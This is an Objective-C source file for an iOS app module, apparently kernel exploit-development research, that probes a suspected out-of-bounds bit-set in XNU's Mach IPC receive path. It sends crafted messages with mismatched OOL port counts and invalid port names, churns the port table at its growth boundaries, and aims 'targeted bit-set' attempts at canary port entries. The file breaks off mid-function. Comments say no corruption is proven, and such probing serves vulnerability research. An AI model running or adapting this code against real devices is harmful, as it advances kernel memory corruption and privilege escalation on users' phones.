#import "KPAuditIPCModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <mach/message.h>
#import <mach_debug/ipc_info.h>

@interface KPAuditIPCModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditIPCModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"ipc112514.translate.armed";
        _title = @"Mach IPC translate-receive (armed)";
        _subtitle = @"index OOB bit-set: send+recv port descriptors + itable churn at growth boundary";
        _icon = @"arrow.left.arrow.right.circle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-ipc-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ipc] %@", line];
}

// Send one message with `count` COPY_SEND port descriptors (all referencing the
// same local send right), then RECEIVE it back — the receive is what actually
// runs ipc_port_translate_receive (the vulnerable function).
- (NSDictionary *)sendReceiveCount:(uint32_t)count port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    // mach_msg_port_descriptor_t is 12 bytes here (name/disposition/type u32
    // triple) — hardcoding a 16-byte stride made the kernel's parser walk
    // misaligned descriptors (MACH_SEND_INVALID_HEADER). Use sizeof.
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = (size_t)count * descSize;
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + descBytes;
    result[@"desc_size"] = @(descSize);
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }

    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 0x4b50;

    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = count;

    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    for (uint32_t i = 0; i < count; i++) {
        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
        pd->name = sendRight;
        pd->disposition = MACH_MSG_TYPE_COPY_SEND;
        pd->type = MACH_MSG_PORT_DESCRIPTOR;
    }

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"send_kr"] = @(kr);
    if (kr != KERN_SUCCESS) {
        free(buf);
        return result;
    }

    // Receive translation path; a descriptor-count mismatch alone is not an OOB oracle.
    size_t rcvTotal = total + 64;
    uint8_t *rcv = calloc(1, rcvTotal);
    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
    rh->msgh_size = (mach_msg_size_t)rcvTotal;
    rh->msgh_local_port = port;
    kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
                  port, 250, MACH_PORT_NULL);
    result[@"recv_kr"] = @(kr);
    if (kr == KERN_SUCCESS && rh->msgh_size >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        if (rb->msgh_descriptor_count > count) {
            result[@"unexpected_desc_delta"] = @(rb->msgh_descriptor_count - count);
        }
        size_t available = (rh->msgh_size - sizeof(mach_msg_header_t) - sizeof(mach_msg_body_t)) / descSize;
        uint32_t descriptorsToRelease = MIN((size_t)rb->msgh_descriptor_count, available);
        uint8_t *receivedBase = rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < descriptorsToRelease; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(receivedBase + i * descSize);
            if (pd->type == MACH_MSG_PORT_DESCRIPTOR && pd->name != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), pd->name);
            }
        }
    }
    free(rcv);
    free(buf);
    return result;
}

// Churn the ipc entry table around the changed growth/free path.
// This creates lifecycle pressure only; it does not localize or prove a bug.
- (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
    for (int i = 0; i < count; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr == KERN_SUCCESS) {
            [held addObject:@(p)];
            if (held.count > 4096) {
                mach_port_t old = (mach_port_t)[held.firstObject unsignedIntValue];
                [held removeObjectAtIndex:0];
                mach_port_destroy(mach_task_self(), old);
            }
        }
    }
}

#pragma mark - ipc_entry_grow_table boundary diagnostics

- (NSDictionary *)portSpaceBasicSnapshot {
    ipc_info_space_basic_t info = {0};
    kern_return_t kr = mach_port_space_basic_info(mach_task_self(), &info);
    return @{
        @"kr": @(kr), @"table_size": @(info.iisb_table_size),
        @"table_inuse": @(info.iisb_table_inuse),
    };
}

- (NSDictionary *)runIPCEntryGrowthDiagnosticAtPort:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSDictionary *initial = [self portSpaceBasicSnapshot];
    if ([initial[@"kr"] intValue] != KERN_SUCCESS) {
        return @{@"status": @"SPACE_INFO_FAILED", @"initial": initial};
    }
    uint32_t initialSize = [initial[@"table_size"] unsignedIntValue];
    if (initialSize < 2 || initialSize > 1024) {
        return @{@"status": @"BASELINE_OUTSIDE_BOUNDED_RANGE", @"initial": initial};
    }

    uint32_t targets[] = {
        initialSize - 1, initialSize, initialSize + 1,
        initialSize * 2 - 1, initialSize * 2, initialSize * 2 + 1,
    };
    NSMutableArray *rounds = [NSMutableArray array];
    for (size_t round = 0; round < sizeof(targets) / sizeof(targets[0]); round++) {
        uint32_t target = targets[round];
        NSDictionary *before = [self portSpaceBasicSnapshot];
        uint32_t beforeInUse = [before[@"table_inuse"] unsignedIntValue];
        if ([before[@"kr"] intValue] != KERN_SUCCESS || target <= beforeInUse) {
            [rounds addObject:@{@"target_inuse": @(target), @"before": before,
                                @"status": @"TARGET_BELOW_BASELINE_OR_INFO_FAILED"}];
            continue;
        }

        NSMutableArray *allocated = [NSMutableArray array];
        uint32_t allocationFailures = 0;
        kern_return_t lastAllocationKR = KERN_SUCCESS;
        while (beforeInUse + allocated.count < target && allocated.count < 2048) {
            mach_port_t name = MACH_PORT_NULL;
            lastAllocationKR = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &name);
            if (lastAllocationKR != KERN_SUCCESS) {
                allocationFailures++;
                break;
            }
            [allocated addObject:@(name)];
        }

        NSDictionary *afterAllocation = [self portSpaceBasicSnapshot];
        NSDictionary *message = [self sendReceiveCount:1 port:port sendRight:sendRight];
        uint32_t destroyFailures = 0;
        for (NSNumber *name in allocated) {
            kern_return_t dkr = mach_port_destroy(mach_task_self(), (mach_port_t)name.unsignedIntValue);
            if (dkr != KERN_SUCCESS) destroyFailures++;
        }
        NSDictionary *afterFree = [self portSpaceBasicSnapshot];
        [rounds addObject:@{
            @"target_inuse": @(target), @"before": before,
            @"allocated": @(allocated.count), @"last_allocate_kr": @(lastAllocationKR),
            @"allocate_failures": @(allocationFailures),
            @"after_allocate": afterAllocation,
            @"table_grew": @([afterAllocation[@"table_size"] unsignedIntValue] >
                             [before[@"table_size"] unsignedIntValue]),
            @"send_kr": message[@"send_kr"] ?: @(-1),
            @"recv_kr": message[@"recv_kr"] ?: @(-1),
            @"recv_desc_count": message[@"recv_desc_count"] ?: @0,
            @"destroy_failures": @(destroyFailures), @"after_free": afterFree,
            @"inuse_restored": @([afterFree[@"table_inuse"] unsignedIntValue] == beforeInUse),
        }];
    }
    return @{
        @"shape": @"ipc_entry_grow_table allocate/free + one-descriptor send/receive",
        @"initial": initial, @"rounds": rounds,
        @"oracle": @"table size/inuse and kr values only; accepted messages do not prove OOB or UAF",
    };
}

#pragma mark - Diagnostics: which message shape is rejected

- (NSDictionary *)sendShape:(NSString *)shape
                  complexBit:(BOOL)complex
              descriptorCount:(uint32_t)count
                    msghID:(int32_t)msgID
                        port:(mach_port_t)port
                  sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = complex ? (size_t)count * descSize : 0;
    size_t total = sizeof(mach_msg_header_t) + (complex ? sizeof(mach_msg_body_t) : 0) + descBytes;
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | (complex ? MACH_MSGH_BITS_COMPLEX : 0);
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = msgID;
    if (complex) {
        mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
        body->msgh_descriptor_count = count;
        uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < count; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
            pd->name = sendRight;
            pd->disposition = MACH_MSG_TYPE_COPY_SEND;
            pd->type = MACH_MSG_PORT_DESCRIPTOR;
        }
    }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"shape"] = shape;
    result[@"size"] = @(total);
    result[@"desc_size"] = @(descSize);
    result[@"send_kr"] = @(kr);
    free(buf);
    // Drain our own message: the port queue limit is ~5 — without a receive,
    // the matrix fills the queue and every later send blocks (the "hang").
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 64;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);
        free(rcv);
    }
    return result;
}

#pragma mark - OOL ports array: crafted count (the ool_port_array lane)

// mach_msg_ool_ports_descriptor_t carries an ARRAY of ports + a count field.
// This lane varies valid versus deliberately invalid entries and records the
// validation boundary. The allocation always covers `count`; no userspace OOB
// read or kernel OOB transfer is inferred from an accepted message.
- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:YES];
}

- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight useSpray:(BOOL)useSpray {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;

    // Allocate enough entries to cover both `real` and `count` (plus padding),
    // so the kernel's copyin never reads past our buffer.
    uint32_t allocEntries = (count > real ? count : real) + 32;
    mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
    // Fill first 'real' entries with valid ports, rest with INVALID names
    // (MACH_PORT_NULL is legal in OOL arrays — kernel accepts it without error)
    for (uint32_t i = 0; i < allocEntries; i++) {
        ports[i] = (i < real) ? sendRight : (mach_port_t)(0xdeadbee0 + i);
    }

    uint8_t *buf = calloc(1, total);
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 2;
    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *od =
        (mach_msg_ool_ports_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
    od->address = ports;
    od->count = count;          // THE crafted value
    od->disposition = MACH_MSG_TYPE_COPY_SEND;
    od->deallocate = 0;
    od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"ool_count"] = @(count);
    result[@"real"] = @(real);
    result[@"send_kr"] = @(kr);
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 512;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);

        // Minimal parse: just read the descriptor count from the body
        if (rkr == KERN_SUCCESS && rcvTotal >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
            mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
            result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        }
        free(rcv);
    }
    free(buf);
    free(ports);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · IPC translate_receive index OOB ===\n"];
    [report appendString:@"Fix-diff hypothesis: 27.2 changes bounds handling in the 16-byte-stride\n"];
    [report appendString:@"ipc_port_translate_receive table walk and in ipc_entry_grow_table.\n"];
    [report appendString:@"Candidate mechanism under test: table[index] access and bit-set attribution.\n"];
    [report appendString:@"translate_receive runs at RECEIVE time, so the probe sends AND receives.\n"];
    [report appendString:@"The measured growth matrix records table_size/table_inuse at each boundary.\n"];
    [report appendString:@"A crash address alone is not proof; index control and table base require independent evidence.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    [report appendFormat:@"port allocate kr=%d port=%u\n", kr, port];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"\nVERDICT: PORT_ALLOCATE_FAILED\n"];
        return report;
    }
    kern_return_t insertKR = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    [report appendFormat:@"send-right insert kr=%d\n", insertKR];
    if (insertKR != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        [report appendString:@"\nVERDICT: SEND_RIGHT_INSERT_FAILED\n"];
        return report;
    }

    NSDictionary *growth = [self runIPCEntryGrowthDiagnosticAtPort:port sendRight:port];
    [report appendString:@"\n--- ipc_entry_grow_table measured boundary matrix ---\n"];
    [report appendFormat:@"%@\n", growth];
    [self journal:[NSString stringWithFormat:@"GROWTH_MATRIX %@", growth]];

    NSMutableArray *held = [NSMutableArray array];
    [self churnItableWithPorts:held count:512];
    [self journal:[NSString stringWithFormat:@"CHURN_BASE held=%d", (int)held.count]];

    [report appendString:@"\n--- diagnostic matrix (why does send fail?) ---\n"];
    // 0x10000408 on every send: either descriptor layout or iOS mach message
    // filtering (MACH_SEND_MSG_FILTERED). The matrix isolates the cause.
    NSDictionary *d1 = [self sendShape:@"simple" complexBit:NO descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d1];
    NSDictionary *d2 = [self sendShape:@"complex0-id0" complexBit:YES descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d2];
    NSDictionary *d3 = [self sendShape:@"complex1-id0" complexBit:YES descriptorCount:1 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d3];
    NSDictionary *d4 = [self sendShape:@"complex1-id4b50" complexBit:YES descriptorCount:1 msghID:0x4b50 port:port sendRight:port];
    [report appendFormat:@"%@\n", d4];
    NSDictionary *d5 = [self sendShape:@"complex1-id1" complexBit:YES descriptorCount:1 msghID:1 port:port sendRight:port];
    [report appendFormat:@"%@\n", d5];

    [report appendString:@"\n--- descriptor-count sweep (send+recv) ---\n"];
    uint32_t counts[] = {1, 2, 4, 8, 16, 32, 64, 128};
    for (size_t i = 0; i < sizeof(counts)/sizeof(counts[0]); i++) {
        NSDictionary *r = [self sendReceiveCount:counts[i] port:port sendRight:port];
        [report appendFormat:@"count=%u -> %@\n", counts[i], r];
        [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
    }

    [report appendString:@"\n--- OOL ports array: validation matrix ---\n"];
    // The first 64 entries are valid send rights; later entries are deliberately
    // invalid names inside the same fully allocated backing buffer.
    uint32_t oolCounts[] = {1, 4, 16, 64, 65, 128, 256, 1024, 4096};
    for (size_t i = 0; i < sizeof(oolCounts)/sizeof(oolCounts[0]); i++) {
        NSDictionary *r = [self sendOOLPortsCount:oolCounts[i] realEntries:64 port:port sendRight:port];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool count=%u kr=%@/%@",
                       oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
    }

    [report appendString:@"\n--- OOL validation threshold (64..96 valid/invalid entries) ---\n"];
    uint32_t lastOK = 0, threshold = 0, acceptedOversized = 0;
    for (uint32_t c = 64; c <= 96; c++) {
        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_desc_count=%@",
                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_desc_count"]]];
        if ([r[@"send_kr"] intValue] == 0) {
            lastOK = c;
            if (c > 64 && [r[@"recv_kr"] intValue] == 0) acceptedOversized++;
        } else if (threshold == 0) {
            threshold = c;
        }
        usleep(2000);
    }
    [report appendFormat:@"\nthreshold analysis: last_ok=%u first_rejection=%u delta=%u accepted_oversized=%u\n",
     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, acceptedOversized];
    if (acceptedOversized > 0) {
        [report appendString:@"Some counts with invalid entries were accepted; this is a validation observation only.\n"];
        [report appendString:@"The backing allocation covers every count, so no OOB transfer is demonstrated.\n"];
    } else if (threshold > 0) {
        [report appendFormat:@"First rejected count: %u; inspect send_kr/recv_kr rather than inferring a clamp.\n", threshold];
    }

    // --- precise ie_bits oracle (mach_port_type + mach_port_get_refs) ---
    // Per ollie: mach_msg_send is blind to OR-mutations of ie_bits.
    // Use mach_port_type() + mach_port_get_refs() for exact bit/urefs comparison.
    // Also use MACH_MSG_TYPE_MOVE_RECEIVE to trigger ipc_port_translate_receive.
    [report appendString:@"\n--- precise ie_bits oracle (MOVE_RECEIVE) ---\n"];

    #define PRECISE_N 64
    mach_port_t pcanary[PRECISE_N];
    mach_port_type_t ptype_before[PRECISE_N];
    mach_port_urefs_t prefs_before[PRECISE_N];

    for (int i = 0; i < PRECISE_N; i++) {
        pcanary[i] = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &pcanary[i]);
        mach_port_insert_right(mach_task_self(), pcanary[i], pcanary[i], MACH_MSG_TYPE_MAKE_SEND);
        mach_port_type(mach_task_self(), pcanary[i], &ptype_before[i]);
        mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_before[i]);
    }

    // Send message with MOVE_RECEIVE descriptor to trigger ipc_port_translate_receive
    #pragma pack(push, 4)
    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t desc[2];
    } moveMsg;
    #pragma pack(pop)

    mach_port_t moveRx = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &moveRx);
    mach_port_insert_right(mach_task_self(), moveRx, moveRx, MACH_MSG_TYPE_MAKE_SEND);

    memset(&moveMsg, 0, sizeof(moveMsg));
    moveMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    moveMsg.hdr.msgh_size = sizeof(moveMsg);
    moveMsg.hdr.msgh_remote_port = port;
    moveMsg.hdr.msgh_id = 0x112514;
    moveMsg.body.msgh_descriptor_count = 2;
    moveMsg.desc[0].name = pcanary[0];
    moveMsg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    moveMsg.desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
    moveMsg.desc[1].name = moveRx;
    moveMsg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    moveMsg.desc[1].type = MACH_MSG_PORT_DESCRIPTOR;

    kern_return_t moveSend = mach_msg(&moveMsg.hdr, MACH_SEND_MSG, sizeof(moveMsg), 0,
                                       MACH_PORT_NULL, 0, MACH_PORT_NULL);
    [report appendFormat:@"MOVE_RECEIVE send_kr=0x%x\n", (unsigned)moveSend];

    // Receive to trigger translate_receive
    uint8_t moveRx2[256] = {0};
    mach_msg_header_t *rxh = (mach_msg_header_t *)moveRx2;
    kern_return_t moveRecv = mach_msg(rxh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                       sizeof(moveRx2), port, 50, MACH_PORT_NULL);
    [report appendFormat:@"MOVE_RECEIVE recv_kr=0x%x\n", (unsigned)moveRecv];

    // Check canaries with precise oracle
    int mutations = 0;
    for (int i = 0; i < PRECISE_N; i++) {
        mach_port_type_t ptype_now = 0;
        mach_port_urefs_t prefs_now = 0;
        kern_return_t kr1 = mach_port_type(mach_task_self(), pcanary[i], &ptype_now);
        kern_return_t kr2 = mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_now);
        if (kr1 != KERN_SUCCESS || kr2 != KERN_SUCCESS ||
            ptype_now != ptype_before[i] || prefs_now != prefs_before[i]) {
            [report appendFormat:@"  MUTATION canary[%d] port=0x%x (idx=%u): type 0x%x->0x%x, srefs %u->%u\n",
             i, pcanary[i], pcanary[i] >> 8,
             ptype_before[i], ptype_now, prefs_before[i], prefs_now];
            mutations++;
        }
    }
    [report appendFormat:@"ie_bits mutations: %d/%d\n", mutations, PRECISE_N];

    for (int i = 0; i < PRECISE_N; i++) mach_port_destroy(mach_task_self(), pcanary[i]);
    mach_port_destroy(mach_task_self(), moveRx);
    // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
    // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
    [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
    [report appendFormat:@"DEBUG: pid=%d — attach debugserver now, 5s window\n", getpid()];
    [self journal:[NSString stringWithFormat:@"DEBUG pid=%d — attach debugserver", getpid()]];
    fflush(stdout);
    sleep(5);  // short window — iOS watchdog kills UI apps after ~10s unresponsive
    #define CANARY_N 128
    mach_port_t canary[CANARY_N];
    uint32_t canaryAlive[CANARY_N];
    for (int i = 0; i < CANARY_N; i++) {
        canary[i] = MACH_PORT_NULL;
        kern_return_t ckr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &canary[i]);
        if (ckr == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), canary[i], canary[i], MACH_MSG_TYPE_MAKE_SEND);
            canaryAlive[i] = 1;
        } else {
            canaryAlive[i] = 0;
        }
    }

    // Snapshot: try to send to each canary port (alive check)
    uint8_t pingBuf[256];
    for (int i = 0; i < CANARY_N; i++) {
        if (!canaryAlive[i]) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) canaryAlive[i] = 2; // was already dead
        else {
            // drain
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveBefore = 0;
    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
    [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];
    // Log port names so we can see the range
    for (int i = 0; i < CANARY_N && i < 8; i++) {
        [report appendFormat:@"  canary[%d] port=%u\n", i, canary[i]];
    }
    [self journal:[NSString stringWithFormat:@"canary_names sample: %u %u %u %u",
                   canary[0], canary[1], canary[2], canary[3]]];

    // Trigger translate_receive using canary NAME>>8 as w2.
    // XNU port names: (index << 8) | generation. w2 = index = name >> 8.
    // If w2 = name>>8, bit-set at table[name>>8] hits this port's entry.
    [report appendString:@"\n--- targeted bit-set: name>>8 as w2 ---\n"];
    int targeted = 0, targetedDead = 0;
    for (int i = 0; i < CANARY_N; i += 4) {
        if (canaryAlive[i] != 1) continue;
        uint32_t name = (uint32_t)canary[i];
        uint32_t w2 = name >> 8;  // XNU index component
        if (w2 == 0) continue;
        NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
        targeted++;
        [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
                       w2, canary[i], tr[@"send_kr"], tr[@"recv_kr"]]];

        // Immediately check THIS port
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) {
            targetedDead++;
            [report appendFormat:@"TARGETED SEND FAILURE: port=%u name=%u after w2=%u (send_kr=%d)\n",
             canary[i], w2, w2, skr];
        } else {
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    [report appendFormat:@"targeted result: %d attempts, %d send failures\n", targeted, targetedDead];
    if (targetedDead > 0) {
        [report appendString:@"Send failures are unverified lifecycle signals; w2 source and bit-set attribution are not proven.\n"];
    } else {
        [report appendString:@"No targeted send-status delta observed; this does not identify or exclude an index source.\n"];
    }


    // Earlier w2 discovery and OOB-value tests were removed after app crashes.
    // See journal for threshold sweep and canary results.

    // Snapshot again
    int changed = 0;
    for (int i = 0; i < CANARY_N; i++) {
        if (canaryAlive[i] != 1) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) {
            changed++;
            canaryAlive[i] = 2;
            [report appendFormat:@"canary[%d] port=%u send failure after trigger (send_kr=%d)\n", i, canary[i], skr];
        } else {
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveAfter = 0;
